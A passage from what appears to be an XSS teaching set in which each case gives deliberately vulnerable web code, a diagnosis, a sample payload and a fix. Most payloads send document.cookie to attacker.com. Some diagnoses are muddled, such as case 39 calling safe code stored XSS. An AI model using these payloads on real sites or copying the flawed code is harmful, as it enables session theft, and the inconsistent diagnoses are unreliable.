		"results": results,
	})
```

```
<!-- results.html -->
<html>
<body>
	<h1>Search Results</h1>
	{{ summary }}
	<ul>
	{% for result in results %}
		<li>{{ result }}</li>
	{% endfor %}
	</ul>
</body>
</html>
```

Case 28:

```
# main.py
from fastapi import FastAPI, Request
from fastapi.templating import Jinja2Templates
from markupsafe import escape

app = FastAPI()
templates = Jinja2Templates(directory="templates")

@app.get("/profile")
def profile(request: Request, username: str = "guest", theme: str = "light"):
	safe_username = str(escape(username))
	return templates.TemplateResponse("profile.html", {
		"request": request,
		"username": safe_username,
		"theme": theme,
	})
```

```
<!-- templates/profile.html -->
<html>
<body>
	<div class={{ theme }}>
		<h1>Welcome, {{ username }}!</h1>
		<p>Your profile is loading...</p>
	</div>
</body>
</html>
```

1. 
	A. Reflected XSS for `username` variable. Misplaced Escaping. 

	There is no need for `escape()` call in the backend.

	HTML autoescaping takes place in the template automatically
	B. Wrong context escaping for `theme`. The `theme` in the

	template must be wrapped in double quotes for proper escaping

	of the HTML attribute.

2. 

Below is a sample payload for `username` once the `escape()` call

is removed from the backend:

```
/?username=</h1><script>fetch('https://attacker.com/?q='+document.cookie);</script>
```

Below is a sample payload for `theme`:


```
?theme=x onmouseover=fetch('https://attacker.com?q='+document.cookie)
```

3. Below is the fix:


```
# main.py
from fastapi import FastAPI, Request
from fastapi.templating import Jinja2Templates

app = FastAPI()
templates = Jinja2Templates(directory="templates")

@app.get("/profile")
def profile(request: Request, username: str = "guest", theme: str = "light"):
	return templates.TemplateResponse("profile.html", {
		"request": request,
		"username": username,
		"theme": theme,
	})
```

```
<!-- templates/profile.html -->
<html>
<body>
	<div class="{{ theme }}">
		<h1>Welcome, {{ username }}!</h1>
		<p>Your profile is loading...</p>
	</div>
</body>
</html>
```

Case 29:

```
<!DOCTYPE html>
<html>
<head>
	<title>Support Chat</title>
</head>
<body>
	<h1>Live Support</h1>
	<div id="chat-log"></div>
	<input type="text" id="msg-input" placeholder="Type a message...">
	<button onclick="sendMessage()">Send</button>

	<script>
		const chatLog = document.getElementById("chat-log");

		function sendMessage() {
			const input = document.getElementById("msg-input");
			const msg = input.value;

			const encoded = encodeURIComponent(msg);
			chatLog.innerHTML += "<p><strong>You:</strong> " + encoded + "</p>";
			input.value = "";
		}
	</script>
</body>
</html>
```

1. DOM XSS. Wrong context escaping. No need for `encodeURIComponent()`

call in frontend. The `innerHTML` should be replaced with

`textContent`.

2. Below is a sample payload:

```
</p><img src=x onerror=\"fetch('https://attacker.com/?q='+document.cookie)\"><p>
```

3. Below is the fix:

```
<!DOCTYPE html>
<html>
<head>
	<title>Support Chat</title>
</head>
<body>
	<h1>Live Support</h1>
	<div id="chat-log"></div>
	<input type="text" id="msg-input" placeholder="Type a message...">
	<button onclick="sendMessage()">Send</button>

	<script>
		const chatLog = document.getElementById("chat-log");

		function sendMessage() {

			const input = document.getElementById("msg-input");

			const msg = input.value;

			const p = document.createElement('p');

			const strong = document.createElement('strong');
	
			strong.textContent = "You:";

			p.appendChild(strong);

			p.appendChild(document.createTextNode(' ' + msg));

			chatLog.appendChild(p);	

			input.value = "";
		}
	</script>
</body>
</html>
```

Case 30:

```
// components/CommentFeed.jsx
function CommentFeed() {
	const [comments, setComments] = React.useState([]);
	const [input, setInput] = React.useState("");

	function addComment() {
		setComments([...comments, input]);
		setInput("");
	}

	return (
		<div>
			<h2>Comments</h2>
			<input
				type="text"
				value={input}
				onChange={e => setInput(e.target.value)}
			/>
			<button onClick={addComment}>Post</button>
			<ul>
				{comments.map((comment, i) => (
					<li
						key={i}
						ref={el => el && (el.innerHTML = comment)}
					/>
				))}
			</ul>
		</div>
	);
}
```

1. DOM XSS. Missing escaping.

2. Below is a sample payload:

```
<img src=x onerror="fetch('https://attacker.com/?q='+document.cookie)">
```

3. Below is the fix:

```
// components/CommentFeed.jsx
function CommentFeed() {
	const [comments, setComments] = React.useState([]);
	const [input, setInput] = React.useState("");

	function addComment() {
		setComments([...comments, input]);
		setInput("");
	}

	return (
		<div>
			<h2>Comments</h2>
			<input
				type="text"
				value={input}
				onChange={e => setInput(e.target.value)}
			/>
			<button onClick={addComment}>Post</button>
			<ul>
				{comments.map((comment, i) => (
					<li
						key={i}
						ref={el => el && (el.textContent = comment)}
					/>
				))}
			</ul>
		</div>
	);
}
```

Case 31:

```
# views.py
from django.shortcuts import render

def dashboard(request):
	msg = request.GET.get("msg", "")
	return render(request, "dashboard.html", {"msg": msg})
```

```
<!-- dashboard.html -->
<html>
<head>
	<script>
		function showBanner(msg) {
			document.getElementById("banner").innerHTML =
				"<p>Notification: " + msg + "</p>";
		}
	</script>
</head>
<body>
	<div id="banner"></div>
	<h1>Dashboard</h1>
	<script>
		showBanner("{{ msg }}");
	</script>
</body>
</html>
```

1. Reflected XSS. Wrong context escaping. Javascript escaping

required.

2. Below is the sample payload:

```
/?msg=</p><img src=x onerror="fetch('https://attacker.com/?q='+document.cookie)"><p>
```

3. Below is a sample fix:

```
# views.py
from django.shortcuts import render

def dashboard(request):
	msg = request.GET.get("msg", "")
	return render(request, "dashboard.html", {"msg": msg})
```

```
<!-- dashboard.html -->
<html>
<head>
	<script>
		function showBanner(msg) {

			const banner = document.getElementById("banner");

			const p = document.createElement('p');

			p.textContent = `Notification: ${msg}`;

			banner.appendChild(p);
		}
	</script>
</head>
<body>
	<div id="banner"></div>
	<h1>Dashboard</h1>
	<script>
		showBanner("{{ msg|escapejs }}");
	</script>
</body>
</html>
```

Case 32:

```
# main.py
from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse

app = FastAPI()

@app.get("/settings", response_class=HTMLResponse)
def settings(request: Request, lang: str = "en"):
	return f"""
	<html>
	<body>
		<h1>Settings</h1>
		<p>Your language preference: {lang}</p>
		<p>Visit our <a href="/help?lang={lang}">help page</a>.</p>
	</body>
	</html>
	"""
```

1. 

Reflected XSS. Missing HTML escaping for the line:

```
		<p>Your language preference: {lang}</p>
```

Reflected XSS. Missing HTML escaping for the href tag in the

code snippet:

```
		<p>Visit our <a href="/help?lang={lang}">help page</a>.</p>
```  

2. Below is a sample payload:

```
		<p>Visit our <a href="/help?lang={lang}">help page</a>.</p>
```  


Payload targeting line above:

```
/?lang=" onclick="fetch('https://attacker.com/?'+document.cookie)
```

Below is a sample payload:

```
		<p>Your language preference: {lang}</p>
```

Payload targeting line above:

```
/?lang=</p><script>fetch('https://attacker.com/?q='+document.cookie);</script><p>
```

3. Below is the fix:

```
# main.py
from fastapi import FastAPI, Request
from fastapi.templating import Jinja2Templates

templates = Jinja2Templates(directory="templates")

app = FastAPI()

@app.get("/settings")
def settings(request: Request, lang: str = "en"):

    	return templates.TemplateResponse("lang.html",{ "request": request,"lang" : lang})

```

```
<!--lang.html-->
<html>
<body>
	<h1>Settings</h1>
	<p>Your language preference: {{lang}}</p>
	<p>Visit our <a href="/help?lang={{lang}}">help page</a>.</p>
</body>
</html>

```
Case 33:

```
# app.py
from flask import Flask, request, jsonify
from markupsafe import escape

app = Flask(__name__)

activity_feed = []

@app.route("/activity", methods=["POST"])
def add_activity():
	data = request.get_json()
	action = str(escape(data.get("action", "")))
	activity_feed.append(action)
	return jsonify({"status": "saved"})

@app.route("/feed")
def feed():
	return jsonify({"feed": activity_feed})
```

```
<!-- feed.html (served separately as a static file) -->
<!DOCTYPE html>
<html>
<body>
	<h1>Activity Feed</h1>
	<div id="feed"></div>

	<script>
		fetch("/feed")
			.then(res => res.json())
			.then(data => {
				data.feed.forEach(item => {
					document.getElementById("feed").innerHTML += "<p>" + item + "</p>";
				});
			});
	</script>
</body>
</html>
```

1. Stored XSS. Misplaced Escaping. 

2. Below is the payload:

```
POST /activity
Content-Type: application/json

{"action": "<img src=x onerror=\"fetch('https://attacker.com/?q='+document.cookie)\">"}
```

3. Below is the fix:

```
# app.py
from flask import Flask, request, jsonify
from markupsafe import escape

app = Flask(__name__)

activity_feed = []

@app.route("/activity", methods=["POST"])
def add_activity():
	data = request.get_json()
	action = data.get("action", "")
	activity_feed.append(action)
	return jsonify({"status": "saved"})

@app.route("/feed")
def feed():
	return jsonify({"feed": activity_feed})
```

```
<!-- feed.html (served separately as a static file) -->
<!DOCTYPE html>
<html>
<body>
	<h1>Activity Feed</h1>
	<div id="feed"></div>

	<script>
		fetch("/feed")
			.then(res => res.json())
			.then(data => {
				data.feed.forEach(item => {

					const feed = document.getElementById("feed");

					const p = document.createElement('p');

					p.textContent = `${item}`;

					feed.appendChild(p);
				});
			});
	</script>
</body>
</html>
```

Case 34:

```
# views.py
from django.http import HttpResponse
from django.utils.html import format_html
from .models import Report

def search(request):
	query = request.GET.get("q", "")
	results = Report.objects.filter(title__icontains=query)

	items_html = ""
	for r in results:
		items_html += format_html("<li>{}</li>", r.title)

	html = format_html(
		"<h2>Results for: {}</h2><ul>{}</ul>",
		query,
		items_html
	)
	return HttpResponse(html)
```

1. No vulnerabilities. But the code is unclean. Better code

is presented in (3.)

2. No payloads

3. Below is the fix:

 
```
# views.py
from django.shortcuts import render 
from django.utils.html import format_html
from .models import Report

def search(request):
	query = request.GET.get("q", "")
	results = Report.objects.filter(title__icontains=query)
	
	return render(request, "title.html", {
		"query": query,
		"results": results,
	})
```

```
<!--title.html-->
<html>
<body>
  <h2>Results for: {{ query }}</h2>
  <ul>
    {% for result in results %}
      <li>{{ result.title }}</li>
    {% endfor %}
  </ul>
</body>
</html>
```

Case 35:

```
<!DOCTYPE html>
<html>
<body>
	<h1>Product Search</h1>
	<input type="text" id="search" placeholder="Search products..." />
	<ul id="suggestions"></ul>

	<script>
		const input = document.getElementById("search");
		const suggestions = document.getElementById("suggestions");

		input.addEventListener("input", () => {
			const query = input.value;

			fetch(`/api/suggestions?q=${query}`)
				.then(res => res.json())
				.then(data => {
					suggestions.innerHTML = "";
					data.results.forEach(item => {
						suggestions.insertAdjacentHTML(
							"beforeend",
							`<li class="suggestion">${item.name}</li>`
						);
					});
				});
		});
	</script>
</body>
</html>
```

1. DOM XSS. Missing escaping.

2. Below is a sample payload:

```
</li><img src=x onerror="fetch('https://attacker.com/?q='+document.cookie)"><li>
```

3. Below is the fix:


```
<!DOCTYPE html>
<html>
<body>
	<h1>Product Search</h1>
	<input type="text" id="search" placeholder="Search products..." />
	<ul id="suggestions"></ul>

	<script>
		const input = document.getElementById("search");
		const suggestions = document.getElementById("suggestions");

		input.addEventListener("input", () => {
			const query = input.value;

			fetch(`/api/suggestions?q=${query}`)
				.then(res => res.json())
				.then(data => {
					data.results.forEach(item => {

						const li = document.createElement('li');
	
						li.className = 'suggestion';

						li.textContent = `${item.name}`;

						suggestions.appendChild(li);	
					});
				});
		});
	</script>
</body>
</html>
```

Case 36:

```
// ProfilePage.jsx
import { useEffect, useRef, useState } from "react";

export default function ProfilePage({ userId }) {
	const [profile, setProfile] = useState(null);
	const bioRef = useRef(null);

	useEffect(() => {
		fetch(`/api/profile/${userId}`)
			.then(res => res.json())
			.then(data => setProfile(data));
	}, [userId]);

	useEffect(() => {
		if (profile && bioRef.current) {
			bioRef.current.innerHTML = profile.bio;
		}
	}, [profile]);

	if (!profile) return <p>Loading...</p>;

	return (
		<div className="profile">
			<h1>{profile.displayName}</h1>
			<p>Member since: {profile.joinDate}</p>
			<div className="bio-section" ref={bioRef} />
		</div>
	);
}
```

1. DOM XSS. Missing Escaping.

2. Below is a sample payload:

```
POST /api/profile/attacker
Content-Type: application/json

{ "bio" : "<img src=x onerror=\"fetch('https://attacker.com/?q='+document.cookie)\">" }
```

3. Below is the fix:

```
// ProfilePage.jsx
import { useEffect, useRef, useState } from "react";

export default function ProfilePage({ userId }) {
	const [profile, setProfile] = useState(null);
	const bioRef = useRef(null);

	useEffect(() => {
		fetch(`/api/profile/${userId}`)
			.then(res => res.json())
			.then(data => setProfile(data));
	}, [userId]);

	useEffect(() => {
		if (profile && bioRef.current) {
			bioRef.current.textContent= profile.bio;
		}
	}, [profile]);

	if (!profile) return <p>Loading...</p>;

	return (
		<div className="profile">
			<h1>{profile.displayName}</h1>
			<p>Member since: {profile.joinDate}</p>
			<div className="bio-section" ref={bioRef} />
		</div>
	);
}
```

Case 37:

```
# app.py
from flask import Flask, request, render_template

app = Flask(__name__)

tickets = []

@app.route("/ticket", methods=["POST"])
def submit_ticket():
	title = request.form.get("title", "")
	body = request.form.get("body", "")
	tickets.append({"title": title, "body": body})
	return "Ticket submitted."

@app.route("/tickets")
def view_tickets():
	return render_template("tickets.html", tickets=tickets)
```

```
<!-- tickets.html -->
<!DOCTYPE html>
<html>
<body>
	<h1>Support Tickets</h1>
	{% for ticket in tickets %}
		<div class="ticket">
			<h2>{{ ticket.title }}</h2>
			<div class="body">{% autoescape off %}{{ ticket.body }}{% endautoescape %}</div>
		</div>
	{% endfor %}
</body>
</html>
```

1. Stored XSS. Missing escaping.

2. Below is a sample payload:

```
POST /ticket
Content-Type: application/x-www-form-urlencoded

title=attacker&body=</div><script>fetch('https://attacker.com/?q='+document.cookie);</script><div>
```

3. Below is the fix:

```
# app.py
from flask import Flask, request, render_template

app = Flask(__name__)

tickets = []

@app.route("/ticket", methods=["POST"])
def submit_ticket():
	title = request.form.get("title", "")
	body = request.form.get("body", "")
	tickets.append({"title": title, "body": body})
	return "Ticket submitted."

@app.route("/tickets")
def view_tickets():
	return render_template("tickets.html", tickets=tickets)
```

```
<!-- tickets.html -->
<!DOCTYPE html>
<html>
<body>
	<h1>Support Tickets</h1>
	{% for ticket in tickets %}
		<div class="ticket">
			<h2>{{ ticket.title }}</h2>
			<div class="body">{{ ticket.body }}</div>
		</div>
	{% endfor %}
</body>
</html>
```

Case 38:

```
# views.py
from django.shortcuts import render
from django.utils.html import escape

def preferences(request):
	saved = False
	email = request.POST.get("email", "")

	if request.method == "POST":
		saved = True

	return render(request, "preferences.html", {
		"email": escape(email),
		"saved": saved,
	})
```

```
<!-- preferences.html -->
<!DOCTYPE html>
<html>
<head>
	<script>
		function showConfirmation(email) {
			const banner = document.getElementById("confirmation");
			banner.innerHTML = "Preferences saved for: " + email;
		}
	</script>
</head>
<body>
	<h1>Notification Preferences</h1>
	<form method="POST">
		<input type="text" name="email" placeholder="Email address" />
		<button type="submit">Save</button>
	</form>
	{% if saved %}
		<div id="confirmation"></div>
		<script>
			showConfirmation("{{ email }}");
		</script>
	{% endif %}
</body>
</html>
```

1. Reflected XSS. Wrong Context Escaping.

2. Below is a sample payload:

```
POST /
Content-Type: application/x-www-form-urlencoded

email=<img src=x onerror="fetch('https://attacker.com/?q='+document.cookie)">
```

3. Below is the fix:

```
# views.py
from django.shortcuts import render
from django.utils.html import escape

def preferences(request):
	saved = False
	email = request.POST.get("email", "")

	if request.method == "POST":
		saved = True

	return render(request, "preferences.html", {
		"email": email,
		"saved": saved,
	})
```

```
<!-- preferences.html -->
<!DOCTYPE html>
<html>
<head>
	<script>
		function showConfirmation(email) {
			const banner = document.getElementById("confirmation");
			banner.textContent = `Preferences saved for: ${email}`;
		}
	</script>
</head>
<body>
	<h1>Notification Preferences</h1>
	<form method="POST">
		<input type="text" name="email" placeholder="Email address" />
		<button type="submit">Save</button>
	</form>
	{% if saved %}
		<div id="confirmation"></div>
		<script>
			showConfirmation("{{ email | escapejs }}");
		</script>
	{% endif %}
</body>
</html>
```

Case 39:

```
# main.py
import sqlite3
from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse
from markupsafe import escape

app = FastAPI()

def get_db():
	conn = sqlite3.connect("comments.db")
	conn.row_factory = sqlite3.Row
	return conn

def init_db():
	conn = get_db()
	conn.execute("""
		CREATE TABLE IF NOT EXISTS comments (
			id INTEGER PRIMARY KEY AUTOINCREMENT,
			author TEXT NOT NULL,
			text TEXT NOT NULL
		)
	""")
	conn.commit()
	conn.close()

init_db()

@app.post("/comment")
async def add_comment(request: Request):
	data = await request.json()
	author = str(escape(data.get("author", "")))
	text = str(escape(data.get("text", "")))
	conn = get_db()
	conn.execute(
		"INSERT INTO comments (author, text) VALUES (?, ?)",
		(author, text)
	)
	conn.commit()
	conn.close()
	return {"status": "saved"}

@app.get("/comments", response_class=HTMLResponse)
async def view_comments():
	conn = get_db()
	rows_data = conn.execute("SELECT author, text FROM comments").fetchall()
	conn.close()

	rows = ""
	for c in rows_data:
		rows += f"<tr><td>{c['author']}</td><td>{c['text']}</td></tr>"

	return f"""
	<!DOCTYPE html>
	<html>
	<body>
		<h1>Comments</h1>
		<table>
			<thead><tr><th>Author</th><th>Comment</th></tr></thead>
			<tbody>{rows}</tbody>
		</table>
	</body>
	</html>
	"""
```

1. Stored XSS. Misplaced Escaping. Although escaping is applied

in the backend this can cause display issues.

2. No serious XSS vulnerability but display issues:

3. Below is the fix:


```
# main.py
import sqlite3
from fastapi import FastAPI, Request
from fastapi.templating import Jinja2Templates

templates = Jinja2Templates(directory="templates")

app = FastAPI()

def get_db():
	conn = sqlite3.connect("comments.db")
	conn.row_factory = sqlite3.Row
	return conn

def init_db():
	conn = get_db()
	conn.execute("""
		CREATE TABLE IF NOT EXISTS comments (
			id INTEGER PRIMARY KEY AUTOINCREMENT,
			author TEXT NOT NULL,
			text TEXT NOT NULL
		)
	""")
	conn.commit()
	conn.close()

init_db()

@app.post("/comment")
async def add_comment(request: Request):
	data = await request.json()
	author = data.get("author", "")
	text = data.get("text", "")
	conn = get_db()
	conn.execute(
		"INSERT INTO comments (author, text) VALUES (?, ?)",
		(author, text)
	)
	conn.commit()
	conn.close()
	return {"status": "saved"}

@app.get("/comments")
async def view_comments(request: Request):
	conn = get_db()

	rows_data = conn.execute("SELECT author, text FROM comments").fetchall()

	conn.close()

	return templates.TemplateResponse("rows.html", {

		"request": request,
		
		"rows_data" : rows_data
	})
```

```
<!--rows.html-->
<!DOCTYPE html>
<html>
<body>
	<h1>Comments</h1>
	<table>
		<thead><tr><th>Author</th><th>Comment</th></tr></thead>
		<tbody>
			{% for c in rows_data %}
			<tr>
				<td>{{ c.author }}</td>
				<td>{{ c.text }}</td>
			</tr>
			{% endfor %}
		</tbody>
	</table>
</body>
</html>
```

Case 40:

```
# app.py
import sqlite3
from flask import Flask, request, render_template

app = Flask(__name__)

def get_db():
	conn = sqlite3.connect("reviews.db")
	conn.row_factory = sqlite3.Row
	return conn

def init_db():
	conn = get_db()
	conn.execute("""
		CREATE TABLE IF NOT EXISTS reviews (
			id INTEGER PRIMARY KEY AUTOINCREMENT,
			username TEXT NOT NULL,
			review TEXT NOT NULL
		)
	""")
	conn.commit()
	conn.close()

init_db()

@app.route("/review", methods=["POST"])
def submit_review():
	username = request.form.get("username", "")
	review = request.form.get("review", "")
	conn = get_db()
	conn.execute(
		"INSERT INTO reviews (username, review) VALUES (?, ?)",
		(username, review)
	)
	conn.commit()
	conn.close()
	return "Review submitted."

@app.route("/reviews")
def view_reviews():
	conn = get_db()
	rows = conn.execute("SELECT username, review FROM reviews").fetchall()
	conn.close()
	return render_template("reviews.html", reviews=rows)
```

```
<!-- reviews.html -->
<!DOCTYPE html>
<html>
<head>
	<script>
		function highlightUser(username) {
			document.getElementById("welcome").innerHTML =
				"Welcome back, " + username + "!";
		}
	</script>
</head>
<body>
	<div id="welcome"></div>
	<h1>Product Reviews</h1>
	{% for review in reviews %}
		<div class="review">
			<strong>{{ review.username }}</strong>
			<p>{{ review.review }}</p>
			<script>highlightUser("{{ review.username }}");</script>
		</div>
	{% endfor %}
</body>
</html>
```

1. Stored XSS. Wrong Context escaping.

2. Below is a sample payload:

```
POST /review
Content-Type: application/x-www-form-urlencoded

username=<img src=x onerror="fetch('https://attacker.com/?q='+document.cookie)">&review=x
```

3. Below is a sample fix:


```
# app.py
import sqlite3
from flask import Flask, request, render_template

app = Flask(__name__)

def get_db():
	conn = sqlite3.connect("reviews.db")
	conn.row_factory = sqlite3.Row
	return conn

def init_db():
	conn = get_db()
	conn.execute("""
		CREATE TABLE IF NOT EXISTS reviews (
			id INTEGER PRIMARY KEY AUTOINCREMENT,
			username TEXT NOT NULL,
			review TEXT NOT NULL
		)
	""")
	conn.commit()
	conn.close()

init_db()

@app.route("/review", methods=["POST"])
def submit_review():
	username = request.form.get("username", "")
	review = request.form.get("review", "")
	conn = get_db()
	conn.execute(
		"INSERT INTO reviews (username, review) VALUES (?, ?)",
		(username, review)
	)
	conn.commit()
	conn.close()
	return "Review submitted."

@app.route("/reviews")
def view_reviews():
	conn = get_db()
	rows = conn.execute("SELECT username, review FROM reviews").fetchall()
	conn.close()
	return render_template("reviews.html", reviews=rows)
```

```
<!-- reviews.html -->
<!DOCTYPE html>
<html>
<head>
	<script>
		function highlightUser(username) {
			document.getElementById("welcome").textContent =
				`Welcome back, ${username}!`;
		}
	</script>
</head>
<body>
	<div id="welcome"></div>
	<h1>Product Reviews</h1>
	{% for review in reviews %}
		<div class="review">
			<strong>{{ review.username }}</strong>
			<p>{{ review.review }}</p>
			<script>highlightUser({{ review.username | tojson }});</script>
		</div>
	{% endfor %}
</body>
</html>
```

Case 41:

```
# views.py
import sqlite3
from django.shortcuts import render

def get_db():
	conn = sqlite3.connect("users.db")
	conn.row_factory = sqlite3.Row
	return conn

def profile(request, username):
	conn = get_db()
	row = conn.execute(
		"SELECT username, bio FROM users WHERE username = ?", (username,)
	).fetchone()
	conn.close()
	return render(request, "profile.html", {"user": row})
```

```
<!-- profile.html -->
<!DOCTYPE html>
<html>
<body>
	<h1>{{ user.username }}'s Profile</h1>
	<div class="bio">{{ user.bio | safe }}</div>
</body>
</html>
```

1. Stored XSS. Missing Escaping.

2. Below is a Sample Payload:

A SQL row entry from the `users` table can have such a row as below:

```
user.username: attacker

user.bio: </div><script>fetch('https://attacker.com/?q='+document.cookie);</script><div>
```

3. Below is the fix:


```
# views.py
import sqlite3
from django.shortcuts import render

def get_db():
	conn = sqlite3.connect("users.db")
	conn.row_factory = sqlite3.Row
	return conn

def profile(request, username):
	conn = get_db()
	row = conn.execute(
		"SELECT username, bio FROM users WHERE username = ?", (username,)
	).fetchone()
	conn.close()
	return render(request, "profile.html", {"user": row})
```

```
<!-- profile.html -->
<!DOCTYPE html>
<html>
<body>
	<h1>{{ user.username }}'s Profile</h1>
	<div class="bio">{{ user.bio }}</div>
</body>
</html>
```

Case 42:

```
# app.py
import sqlite3
from flask import Flask, request, render_template
from markupsafe import escape

app = Flask(__name__)

def get_db():
	conn = sqlite3.connect("events.db")
	conn.row_factory = sqlite3.Row
	return conn

def init_db():
	conn = get_db()
	conn.execute("""
		CREATE TABLE IF NOT EXISTS events (
			id INTEGER PRIMARY KEY AUTOINCREMENT,
			title TEXT NOT NULL,
			description TEXT NOT NULL
		)
	""")
	conn.commit()
	conn.close()

init_db()

@app.route("/event", methods=["POST"])
def add_event():
	title = escape(request.form.get("title", ""))
	description = escape(request.form.get("description", ""))
	conn = get_db()
	conn.execute(
		"INSERT INTO events (title, description) VALUES (?, ?)",
		(str(title), str(description))
	)
	conn.commit()
	conn.close()
	return "Event added."

@app.route("/events")
def view_events():
	conn = get_db()
	events = conn.execute("SELECT title, description FROM events").fetchall()
	conn.close()
	return render_template("events.html", events=events)
```

```
<!-- events.html -->
<!DOCTYPE html>
<html>
<body>
	<h1>Upcoming Events</h1>
	{% for event in events %}
		<div class="event">
			<h2>{{ event.title }}</h2>
			<p>{{ event.description }}</p>
		</div>
	{% endfor %}
</body>
</html>
```

1. Technically the code does succeed in defending against XSS but

it can cause display errors.

2. No relevant payload. Just issues with display errors.

3. Below is a sample fix:


```
# app.py
import sqlite3
from flask import Flask, request, render_template
from markupsafe import escape

app = Flask(__name__)

def get_db():
	conn = sqlite3.connect("events.db")
	conn.row_factory = sqlite3.Row
	return conn

def init_db():
	conn = get_db()
	conn.execute("""
		CREATE TABLE IF NOT EXISTS events (
			id INTEGER PRIMARY KEY AUTOINCREMENT,
			title TEXT NOT NULL,
			description TEXT NOT NULL
		)
	""")
	conn.commit()
	conn.close()

init_db()

@app.route("/event", methods=["POST"])
def add_event():
	title = request.form.get("title", "")
	description = request.form.get("description", "")
	conn = get_db()
	conn.execute(
		"INSERT INTO events (title, description) VALUES (?, ?)",
		(title, description)
	)
	conn.commit()
	conn.close()
	return "Event added."

@app.route("/events")
def view_events():
	conn = get_db()
	events = conn.execute("SELECT title, description FROM events").fetchall()
	conn.close()
	return render_template("events.html", events=events)
```

```
<!-- events.html -->
<!DOCTYPE html>
<html>
<body>
	<h1>Upcoming Events</h1>
	{% for event in events %}
		<div class="event">
			<h2>{{ event.title }}</h2>
			<p>{{ event.description }}</p>
		</div>
	{% endfor %}
</body>
</html>
```

Case 43:


```
# views.py
import sqlite3
from django.shortcuts import render

def get_db():
	conn = sqlite3.connect("forum.db")
	conn.row_factory = sqlite3.Row
	return conn

def forum(request):
	if request.method == "POST":
		author = request.POST.get("author", "")
		body = request.POST.get("body", "")
		conn = get_db()
		conn.execute(
			"INSERT INTO posts (author, body) VALUES (?, ?)",
			(author, body)
		)
		conn.commit()
		conn.close()

	conn = get_db()
	posts = conn.execute("SELECT author, body FROM posts").fetchall()
	conn.close()
	return render(request, "forum.html", {"posts": posts})
```

```
<!-- forum.html -->
<!DOCTYPE html>
<html>
<body>
	<h1>Forum</h1>
	{% for post in posts %}
		<div class="post">
			<strong>{{ post.author }}</strong>
			<p>{{ post.body | safe }}</p>
		</div>
	{% endfor %}
	<form method="POST">
		<input type="text" name="author" placeholder="Your name" />
		<textarea name="body" placeholder="Write your post..."></textarea>
		<button type="submit">Post</button>
	</form>
</body>
</html>
```

1. Stored XSS. Missing Escaping.

2. Below is sample payload:

```
POST /
Content-Type: application/x-www-form-urlencoded

body=</p><script>fetch('https://attacker.com/?q='+document.cookie);</script><p>&author=x
```

3. Below is the fix:

```
# views.py
import sqlite3
from django.shortcuts import render

def get_db():
	conn = sqlite3.connect("forum.db")
	conn.row_factory = sqlite3.Row
	return conn

def forum(request):
	if request.method == "POST":
		author = request.POST.get("author", "")
		body = request.POST.get("body", "")
		conn = get_db()
		conn.execute(
			"INSERT INTO posts (author, body) VALUES (?, ?)",
			(author, body)
		)
		conn.commit()
		conn.close()

	conn = get_db()
	posts = conn.execute("SELECT author, body FROM posts").fetchall()
	conn.close()
	return render(request, "forum.html", {"posts": posts})
```

```
<!-- forum.html -->
<!DOCTYPE html>
<html>
<body>
	<h1>Forum</h1>
	{% for post in posts %}
		<div class="post">
			<strong>{{ post.author }}</strong>
			<p>{{ post.body }}</p>
		</div>
	{% endfor %}
	<form method="POST">
		<input type="text" name="author" placeholder="Your name" />
		<textarea name="body" placeholder="Write your post..."></textarea>
		<button type="submit">Post</button>
	</form>
</body>
</html>
```

Case 44:

```
# main.py
import sqlite3
from fastapi import FastAPI, Request
from fastapi.templating import Jinja2Templates
from markupsafe import escape

app = FastAPI()
templates = Jinja2Templates(directory="templates")

def get_db():
	conn = sqlite3.connect("blog.db")
	conn.row_factory = sqlite3.Row
	return conn

def init_db():
	conn = get_db()
	conn.execute("""
		CREATE TABLE IF NOT EXISTS comments (
			id INTEGER PRIMARY KEY AUTOINCREMENT,
			author TEXT NOT NULL,
			body TEXT NOT NULL
		)
	""")
	conn.commit()
	conn.close()

init_db()

@app.post("/comment")
async def add_comment(request: Request):
	data = await request.json()
	author = data.get("author", "")
	body = data.get("body", "")
	conn = get_db()
	conn.execute(
		"INSERT INTO comments (author, body) VALUES (?, ?)",
		(author, body)
	)
	conn.commit()
	conn.close()
	return {"status": "saved"}

@app.get("/comments")
async def view_comments(request: Request):
	conn = get_db()
	comments = conn.execute("SELECT author, body FROM comments").fetchall()
	conn.close()
	return templates.TemplateResponse("comments.html", {
		"request": request,
		"comments": comments,
	})
```

```
<!-- comments.html -->
<!DOCTYPE html>
<html>
<head>
	<script>
		function renderComment(author, body) {
			const div = document.createElement("div");
			div.innerHTML = "<strong>" + author + "</strong><p>" + body + "</p>";
			document.getElementById("comments").appendChild(div);
		}
	</script>
</head>
<body>
	<h1>Blog Comments</h1>
	<div id="comments"></div>
	<script>
		{% for comment in comments %}
			renderComment({{ comment.author | tojson }}, {{ comment.body | tojson }});
		{% endfor %}
	</script>
</body>
</html>
```

1. Stored XSS. Missing Escaping.

2. Below is a sample payload:

```
POST /comment
Content-Type: application/json

{"author": "</strong><strong>", "body": "</p><img src=x onerror=\"fetch('https://attacker.com/?q='+document.cookie)\"><p>"}
```
{::comment}
</strong>
{:comment}

3. Below is the fix:

```
# main.py
import sqlite3
from fastapi import FastAPI, Request
from fastapi.templating import Jinja2Templates
from markupsafe import escape

app = FastAPI()
templates = Jinja2Templates(directory="templates")

def get_db():
	conn = sqlite3.connect("blog.db")
	conn.row_factory = sqlite3.Row
	return conn

def init_db():
	conn = get_db()
	conn.execute("""
		CREATE TABLE IF NOT EXISTS comments (
			id INTEGER PRIMARY KEY AUTOINCREMENT,
			author TEXT NOT NULL,
			body TEXT NOT NULL
		)
	""")
	conn.commit()
	conn.close()

init_db()

@app.post("/comment")
async def add_comment(request: Request):
	data = await request.json()
	author = data.get("author", "")
	body = data.get("body", "")
	conn = get_db()
	conn.execute(
		"INSERT INTO comments (author, body) VALUES (?, ?)",
		(author, body)
	)
	conn.commit()
	conn.close()
	return {"status": "saved"}

@app.get("/comments")
async def view_comments(request: Request):
	conn = get_db()
	comments = conn.execute("SELECT author, body FROM comments").fetchall()
	conn.close()
	return templates.TemplateResponse("comments.html", {
		"request": request,
		"comments": comments,
	})
```

```
<!-- comments.html -->
<!DOCTYPE html>
<html>
<head>
	<script>
		function renderComment(author, body) {

			const div = document.createElement('div');

			const strong = document.createElement('strong');

			strong.textContent = `${author}`;

			const p = document.createElement('p');

			p.textContent = `${body}`;

			div.appendChild(strong);

			div.appendChild(p);
	
			document.getElementById("comments").appendChild(div);
			
		}
	</script>
</head>
<body>
	<h1>Blog Comments</h1>
	<div id="comments"></div>
	<script>
		{% for comment in comments %}
